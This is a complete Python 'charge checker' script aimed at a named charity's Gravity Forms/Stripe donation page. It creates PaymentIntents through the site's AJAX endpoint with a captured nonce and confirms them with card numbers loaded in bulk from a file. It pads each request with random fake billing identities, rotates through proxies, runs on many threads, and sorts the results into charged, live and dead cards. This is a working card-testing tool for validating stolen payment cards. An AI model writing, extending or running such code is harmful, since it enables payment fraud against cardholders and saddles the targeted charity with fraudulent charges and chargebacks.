#!/usr/bin/env python3
"""
Stripe Charge Checker for asaphila.org General Donation form

Flow:
 1) Call GravityForms Stripe AJAX endpoint to create a PaymentIntent
 2) Confirm the PaymentIntent directly on Stripe with custom card details

Card format: number|month|year|cvv
"""

import argparse
import random
import re
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from typing import Dict, List, Optional

import requests
from requests import Session


# ============================================================================
# CONFIG
# ============================================================================

SITE_URL = "https://asaphila.org"
DONATION_URL = "https://asaphila.org/donate/general-donation/"
ADMIN_AJAX_URL = f"{SITE_URL}/wp-admin/admin-ajax.php"

# Public Stripe key observed in HAR
STRIPE_PK = "pk_live_51HjSjMJPATL84oocYAJp5M6aGDhvZQj7IYyeeYt4rKHIjbcsbtf6yUXgNj977psIvPYJYtH6elfIJMfCakfvMHGf00jSRuTOFx"
STRIPE_API = "https://api.stripe.com"
STRIPE_VERSION = "2020-08-27"

# Gravity Forms Stripe AJAX payload pieces from HAR
GF_ACTION = "gfstripe_elements_create_payment_intent"
GF_NONCE = "d162c6ad09"
GF_ENTRY_ID = "1786"
GF_FEED_ID = "12"


FIRST_NAMES = ["John", "Jane", "Michael", "Sarah", "David", "Emily", "James", "Emma"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"]
STREETS = ["Main St", "Oak Ave", "Maple Dr", "Cedar Ln", "Pine Rd", "Elm St", "Park Ave", "Lake Dr"]
CITIES = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego"]
STATES = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA"]
ZIPS = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101"]


@dataclass
class CardDetails:
    number: str
    month: str
    year: str
    cvv: str
    raw: str = ""

    @classmethod
    def from_string(cls, card_str: str) -> "CardDetails":
        parts = card_str.strip().split("|")
        if len(parts) < 4:
            raise ValueError(f"Invalid card format: {card_str}")

        number = re.sub(r"\D", "", parts[0])
        month = parts[1].zfill(2)
        year = parts[2].strip()
        if len(year) == 2:
            year = "20" + year
        cvv = parts[3].strip()

        return cls(number=number, month=month, year=year, cvv=cvv, raw=card_str.strip())


def random_billing() -> Dict[str, str]:
    idx = random.randint(0, len(CITIES) - 1)
    return {
        "name": f"{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}",
        "line1": f"{random.randint(100, 9999)} {random.choice(STREETS)}",
        "line2": "",
        "city": CITIES[idx],
        "state": STATES[idx],
        "zip": ZIPS[idx],
        "country": "US",
    }


class AsaphilaStripeClient:
    def __init__(self, proxy: Optional[str] = None):
        self.session: Session = requests.Session()
        self._setup_session()
        if proxy:
            self._setup_proxy(proxy)

    def _setup_session(self) -> None:
        self.session.headers.update(
            {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
                "Accept": "*/*",
                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
                "Accept-Encoding": "gzip, deflate, br",
            }
        )

    def _setup_proxy(self, proxy: str) -> None:
        parts = proxy.split(":")
        if len(parts) == 4:
            host, port, user, passwd = parts
            proxy_url = f"http://{user}:{passwd}@{host}:{port}"
        elif len(parts) == 2:
            host, port = parts
            proxy_url = f"http://{host}:{port}"
        else:
            proxy_url = f"http://{proxy}"

        self.session.proxies = {"http": proxy_url, "https": proxy_url}

    def get_check_ip(self) -> str:
        """Return the outbound IP used by this session (VPS or proxy exit IP)."""
        # Try multiple services in case one is blocked on VPS
        try:
            r = self.session.get("https://api.ipify.org?format=json", timeout=8)
            if r.status_code == 200:
                return r.json().get("ip", "").strip() or "?"
        except Exception:
            pass
        for url in ("https://icanhazip.com", "https://ifconfig.me/ip", "https://checkip.amazonaws.com"):
            try:
                r = self.session.get(url, timeout=8)
                if r.status_code == 200 and r.text:
                    return r.text.strip()[:45]
            except Exception:
                continue
        return "?"

    def create_payment_intent(self) -> str:
        """
        Hit GravityForms Stripe AJAX endpoint to get a fresh client_secret.
        """
        data = {
            "action": GF_ACTION,
            "nonce": GF_NONCE,
            "entry_id": GF_ENTRY_ID,
            "feed_id": GF_FEED_ID,
        }

        headers = {
            "Origin": SITE_URL,
            "Referer": DONATION_URL,
        }

        resp = self.session.post(ADMIN_AJAX_URL, data=data, headers=headers, timeout=30)
        if resp.status_code != 200:
            raise RuntimeError(f"AJAX status {resp.status_code}")

        try:
            payload = resp.json()
        except Exception as e:
            raise RuntimeError(f"AJAX JSON error: {e}") from e

        if not payload.get("success"):
            raise RuntimeError(f"AJAX not success: {payload}")

        data_obj = payload.get("data") or {}
        client_secret = data_obj.get("client_secret")
        if not client_secret:
            raise RuntimeError(f"No client_secret in AJAX: {payload}")

        return client_secret

    def confirm_payment_intent(self, client_secret: str, card: CardDetails) -> Dict:
        """
        Confirm PaymentIntent with custom card details via Stripe API.
        """
        if "_secret_" not in client_secret:
            raise ValueError("Invalid client_secret format")

        pi_id = client_secret.split("_secret_")[0]
        url = f"{STRIPE_API}/v1/payment_intents/{pi_id}/confirm"

        billing = random_billing()

        data = {
            "payment_method_data[type]": "card",
            "payment_method_data[billing_details][name]": billing["name"],
            "payment_method_data[billing_details][address][line1]": billing["line1"],
            "payment_method_data[billing_details][address][line2]": billing["line2"],
            "payment_method_data[billing_details][address][city]": billing["city"],
            "payment_method_data[billing_details][address][state]": billing["state"],
            "payment_method_data[billing_details][address][postal_code]": billing["zip"],
            "payment_method_data[billing_details][address][country]": billing["country"],
            "payment_method_data[card][number]": card.number,
            "payment_method_data[card][cvc]": card.cvv,
            "payment_method_data[card][exp_month]": card.month,
            "payment_method_data[card][exp_year]": card.year,
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "key": STRIPE_PK,
            "_stripe_version": STRIPE_VERSION,
            "client_secret": client_secret,
        }

        headers = {
            "Authorization": f"Bearer {STRIPE_PK}",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": SITE_URL,
            "Referer": DONATION_URL,
        }

        resp = self.session.post(url, data=data, headers=headers, timeout=60)
        return {
            "status_code": resp.status_code,
            "json": self._safe_json(resp),
            "text": resp.text,
        }

    @staticmethod
    def _safe_json(resp: requests.Response) -> Optional[Dict]:
        try:
            return resp.json()
        except Exception:
            return None


class AsaphilaChecker:
    def __init__(self, proxy: Optional[str] = None):
        self.client = AsaphilaStripeClient(proxy)

    def check_card(self, card: CardDetails) -> Dict:
        try:
            client_secret = self.client.create_payment_intent()
        except Exception as e:
            return {"status": "ERROR", "message": f"PI error: {str(e)[:80]}", "card": card}

        try:
            result = self.client.confirm_payment_intent(client_secret, card)
        except Exception as e:
            return {"status": "ERROR", "message": f"Confirm error: {str(e)[:80]}", "card": card}

        return self._parse_result(result, card)

    def _parse_result(self, result: Dict, card: CardDetails) -> Dict:
        data = result.get("json") or {}

        # Top-level API error
        if "error" in data:
            err = data["error"]
            msg = err.get("message", "Unknown error")
            decline_code = err.get("decline_code") or err.get("code") or ""

            status = "DEAD"
            if decline_code in ("insufficient_funds", "withdrawal_count_limit_exceeded"):
                status = "LIVE"

            return {
                "status": status,
                "message": msg,
                "code": decline_code,
                "card": card,
            }

        status = data.get("status", "")
        last_error = data.get("last_payment_error")

        if status in ("succeeded", "requires_capture"):
            return {
                "status": "CHARGED",
                "message": f"Payment {status}",
                "card": card,
            }

        if status == "requires_action":
            return {
                "status": "LIVE",
                "message": "3DS required (CVV match)",
                "card": card,
            }

        if last_error:
            decline_code = last_error.get("decline_code") or last_error.get("code") or ""
            msg = last_error.get("message", "Declined")

            status = "DEAD"
            if decline_code in ("insufficient_funds", "withdrawal_count_limit_exceeded"):
                status = "LIVE"

            return {
                "status": status,
                "message": msg,
                "code": decline_code,
                "card": card,
            }

        # Fallback
        text = result.get("text", "")
        return {
            "status": "UNKNOWN",
            "message": text[:120],
            "card": card,
        }


def load_cards(path: str) -> List[CardDetails]:
    cards: List[CardDetails] = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            try:
                cards.append(CardDetails.from_string(line))
            except Exception:
                continue
    return cards


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Stripe Charge Checker for asaphila.org General Donation"
    )
    parser.add_argument("card", nargs="?", help="Single card: number|month|year|cvv")
    parser.add_argument("-f", "--file", help="File with cards")
    parser.add_argument("-p", "--proxy", help="Proxy: host:port:user:pass")
    parser.add_argument(
        "-t", "--threads", type=int, default=1, help="Number of threads to use"
    )

    args = parser.parse_args()

    cards: List[CardDetails] = []
    if args.file:
        cards = load_cards(args.file)
    elif args.card:
        try:
            cards = [CardDetails.from_string(args.card)]
        except ValueError as e:
            print(f"Error: {e}")
            sys.exit(1)
    else:
        print("Provide a single card or -f file")
        sys.exit(1)

    total = len(cards)
    charged = live = dead = errors = 0
    threads = max(1, args.threads)

    def run_single(card: CardDetails):
        checker = AsaphilaChecker(proxy=args.proxy)
        return checker.check_card(card), card

    if threads > 1 and total > 1:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(run_single, card) for card in cards]
            idx = 0
            for future in as_completed(futures):
                idx += 1
                res, card = future.result()
                status = res.get("status", "ERROR")
                msg = res.get("message", "")
                code = res.get("code", "")
                display_msg = f"{code} | {msg}" if code else msg

                if status == "CHARGED":
                    charged += 1
                elif status == "LIVE":
                    live += 1
                elif status == "DEAD":
                    dead += 1
                else:
                    errors += 1

                print(f"[{idx}/{total}] {status:8} | {card.raw} | {display_msg}")
    else:
        for idx, card in enumerate(cards, start=1):
            res, _ = run_single(card)
            status = res.get("status", "ERROR")
            msg = res.get("message", "")
            code = res.get("code", "")
            display_msg = f"{code} | {msg}" if code else msg

            if status == "CHARGED":
                charged += 1
            elif status == "LIVE":
                live += 1
            elif status == "DEAD":
                dead += 1
            else:
                errors += 1

            print(f"[{idx}/{total}] {status:8} | {card.raw} | {display_msg}")

    print("\n" + "=" * 60)
    print(f"CHARGED: {charged} | LIVE: {live} | DEAD: {dead} | ERR: {errors}")
    print("=" * 60)


if __name__ == "__main__":
    main()

